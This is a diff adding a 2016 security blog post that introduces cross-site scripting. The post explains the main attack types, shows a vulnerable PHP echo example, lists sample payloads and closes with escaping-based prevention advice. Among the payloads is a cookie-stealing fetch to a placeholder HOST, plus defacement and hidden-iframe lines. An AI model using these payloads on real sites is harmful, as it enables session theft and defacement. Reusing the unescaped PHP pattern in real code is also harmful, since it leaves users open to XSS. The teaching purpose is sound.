@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="RootNetSec is a site about journey through the world of network security, pentesting, Linux administration, programming an networking. View to learn more!">
+    <meta name="author" content="W3ndige">
+    <title>Cross Site Scripting - Root Network Security</title>
+
+    <link rel="canonical" href="http://localhost:4000/2016/08/25/cross-site-scripting-introduction/">
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.png">
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/clean-blog.css">
+
+    <!-- Pygments Github CSS -->
+    <link rel="stylesheet" href="/css/syntax.css">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+    <link href="//https://fonts.googleapis.com/css?family=Nunito:400,700i" rel="stylesheet">
+    <link href='//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+
+    <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Root Network Security" />
+
+</head>
+
+
+<body>
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Root Network Security</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+            <ul class="nav navbar-nav navbar-right">
+                <li>
+                    <a href="/about/">About</a>
+                </li>
+
+                <li>
+                    <a href="/archive/">Archive</a>
+                </li>
+
+                <li>
+                    <a href="/contact/">Contact</a>
+                </li>
+
+                <li>
+                    <a href="/projects/">Projects</a>
+                </li>
+
+                <li>
+                    <a href="/resources/">Resources</a>
+                </li>
+            </ul>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+
+
+    <!-- Post Header -->
+<header class="intro-header" style="background-image: url('/img/cross-site-scripting-header.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <h1>Cross Site Scripting</h1>
+                    
+                    <h2 class="subheading">Introduction to XSS</h2>
+                    
+                    <span class="meta">Posted by W3ndige on August 25, 2016</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+
+				<h1>What is XSS?</h1>
+<p>Cross Site Scripting (XSS) is a name of one of the most common vulnerability in web applications. It's third in the list of the newest <a href="https://www.owasp.org/index.php/Top10">OWASP Top Ten</a> document so it's essential to know how it works. </p>
+<p>Browsers diplay the content of a website using a mix of HTML (HyperText Markup Language which is a core of a webpage) and JavaScript responsible for making things run in response of events (like clicking a button). Of course there are other essential elements like CSS to style the webpage but in order to perform a XSS attack we will only need HTML and Javascript. </p>
+<p>Essence of XSS attack is to inject some malicous code (for example Javascript or other scripting language that can be opened in a browser) into the browser of client using vulnerable web application. That way, an attacker has an ability to execute any malicious code in victim's browser. </p>
+<p>But why is it so powerul? Let's consider this example: You're running some simple WordPress website with small audience. As you don't want spammers to make comments under your posts, you enable the option to only publish comments allowed by yourself. In the meantime some malicous hacker wanted to destroy your webpage (who knows why but there are still people like that). He firstly tests if you really have to allow comments, and then injects into the comment box malicious JavaScript code that will steal cookies and send them to him. Now as you've got a notification that someone published a new comment, you open the WordPress admin page to see what someone has written. In the moment you view this comment, this malicous code steals your admin cookie and sends it to the attacker. Few hours later your site has been pawned. </p>
+<p>Powefull, right? But enough story time for today, let's jump into some technical details. </p>
+
+<h1>Potential results of XSS attack</h1>
+<ul>
+<li><b>Stealing session cookies</b>
+<p>With that attacker is being able to steal someone's logged session - like in the story.</p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;svg</span> <span class="na">onload=</span><span class="s">fetch(‘//HOST/?cookie=’+document.cookie)</span><span class="nt">&gt;</span></code></pre></figure>
+
+</li>
+<li><b>Substituting a content of a website</b>
+<p>Users can be tricked into thinking that "Your site have been hacked".</p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;svg</span> <span class="na">onload=</span><span class="s">”document.body.innerHTML='&lt;img</span> <span class="na">src=</span><span class="s">//HOST/IMAGE</span><span class="nt">&gt;</span>'”&gt;</code></pre></figure>
+
+</li>
+<li><b>Capture the keys pressed by the user</b>
+<p>Ability to log what someone is writing... I don't have to say why it's useful ;)</p>
+
+</li>
+<li><b>Crash the browser</b>
+<p>Local Denial Of Service Attack. Mostly frustrating.</p>
+</li>
+<li>
+<b>Redirect user’s browser to another website</b>
+<p>Attacker can redirect the browser to another webpage that may be prepared with some customized malware ready to attack victims operating system. </p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">//HOST/</span> <span class="na">style=</span><span class="s">display:none</span><span class="nt">&gt;&lt;/iframe&gt;</span></code></pre></figure>
+
+</li>
+<li>
+<b>Creating fake HTML form</b>
+<p>Where an attacker would be able to trick user into entering their credentials and form would send them to an attacker. </p>
+</li>
+</ul>
+
+<h1>Types of XSS attacks</h1>
+<p><b>Persistent (stored) XSS</b> - This type of attack relies on the fact that webpage may store some input, or file in a database. Just like in our story, comments were stored in the WordPress database. It consists of injecting the javascript code into the server side. That's why it's called stored. Every user that sees this stored content is a potential victim. </p>
+<p><b>Reflected XSS</b> - When the website or application just reflects back content maliciously manipulated by user (usually in the URL), we have a reflected XSS attack. Victim usually unwittingly opens a link with some JavaScript code which is sent to the web application. Then this application sends back (that's why reflected) whatever the victim asked for with this JavaScript code resulting in executing it in the browser. </p>
+<p>Let's take a look at this simple PHP code: </p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php">$username = $_GET[‘user’];
+echo “<span class="nt">&lt;h1&gt;</span>Welcome, ” . $username . “!<span class="nt">&lt;/h1&gt;</span>”;</code></pre></figure>
+
+<p>Which would take an username from the URL just like that: </p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html">http://example.com/welcome.php?user=Mike</code></pre></figure>
+
+<p>If you open the web and view the source code it would look like this</p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;h1&gt;</span>Hello, John!<span class="nt">&lt;/h1&gt;</span></code></pre></figure>
+
+<p>But what if we swap the name with some JavaScript code? </p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html">http://example.com/welcome.php?user=<span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s2">"XSS"</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span></code></pre></figure>
+
+<p>After checking the source code of the same webpage opened with this URL, you would notice that the alert box with "XSS" text was triggered.   </p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;h1&gt;</span>Hello, <span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s2">"XSS"</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>!<span class="nt">&lt;/h1&gt;</span></code></pre></figure>
+
+<p>Now with that knowledge you can enter some more malicous code. Reflected XSS attack ready ;)</p>
+
+<p><b>DOM Based XSS</b> is an attack where the malicious code is executed as a result of modyfing DOM (Document Object Model). It's rarest type of XSS attack. Read more at <a href="https://www.owasp.org/index.php/DOM_Based_XSS">OWASP</a>.</p>
+
+<h1>XSS Examples</h1>
+<p><b>1. With script tag</b></p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s2">"XSS"</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span></code></pre></figure>
+
+<p><b>2. With body tag</b></p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;p&gt;&lt;body</span> <span class="na">onload=</span><span class="s">alert("XSS")</span><span class="nt">&gt;&lt;/p&gt;</span></code></pre></figure>
+
+<p><b>3. With img tag</b></p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;p&gt;&lt;img</span> <span class="na">src=</span><span class="s">"blabla"</span> <span class="na">onerror=</span><span class="s">"alert("</span><span class="na">XSS</span><span class="err">")</span><span class="nt">&gt;&lt;/img&gt;&lt;/p&gt;</span></code></pre></figure>
+
+<p><b>4. Or any other tag</b></p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;svg</span> <span class="na">onload=</span><span class="s">alert("XSS")</span><span class="nt">&gt;</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;x</span> <span class="na">onmouseover=</span><span class="s">alert("XSS")</span><span class="nt">&gt;</span></code></pre></figure>
+
+<p><b>5. Resource tag like iframe</b></p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">javascript:alert("XSS")</span><span class="nt">&gt;</span></code></pre></figure>
+
+<p><b>6. Or object tag</b></p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;object</span> <span class="na">data=</span><span class="s">javascript:alert("XSS")</span><span class="nt">&gt;</span></code></pre></figure>
+
+<h1>How to prevent XSS?</h1>
+<p>All right, as we know how XSS attacks works, let's move on to prevention. Essential thing to do is to filter any data sent from the user before viewing them in application (like "&lt;" and "&gt;", tag attributes or HTML entities ). </p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="err">&amp;</span> --&gt; <span class="ni">&amp;amp;</span>
+<span class="nt">&lt; --&gt;</span> <span class="ni">&amp;lt;</span>
+&gt; --&gt; <span class="ni">&amp;gt;</span>
+" --&gt; <span class="ni">&amp;quot;</span>
+' --&gt; <span class="ni">&amp;#x27;</span>     
+/ --&gt; <span class="ni">&amp;#x2F;</span></code></pre></figure>
+
+<p>That method will prevent most of the XSS attacks but for the most sophisticated ones it may be helpful to read <a href="https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet">XSS Prevention Sheet</a>. Another helpful thing would be prevention on the client side - like installing NoScript addition. </p>
+
+<p>As always - thanks for reading and exploring this topic with me. Now after better understanding of XSS we can look for vulnerabilities in many different web applications. Good luck and...</p>
+<p>~ Stay safe! </p>
+
+
+                <hr>
+
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/2016/08/20/buffer-overflow/" data-toggle="tooltip" data-placement="top" title="Buffer Overflow">&larr; Previous Post</a>
+                    </li>
+                    
+                    
+                    <li class="next">
+                        <a href="/2016/08/29/introduction-to-ddos/" data-toggle="tooltip" data-placement="top" title="Distributed Denial of Service Attack">Next Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+
+            </div>
+        </div>
+    </div>
+</article>
+
+<hr>
+
+
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                    <li>
+                        <a href="/feed.xml">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-rss fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    <li>
+                        <a href="https://github.com/w3ndige">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li>
+                        <a href="mailto:w3ndige@protonmail.com">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-envelope fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                </ul>
+                <p class="copyright text-muted">Copyright &copy; RootNetSec 2016 - 2017</p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js "></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js "></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/clean-blog.min.js "></script>
+
+
+</body>
+
+</html>
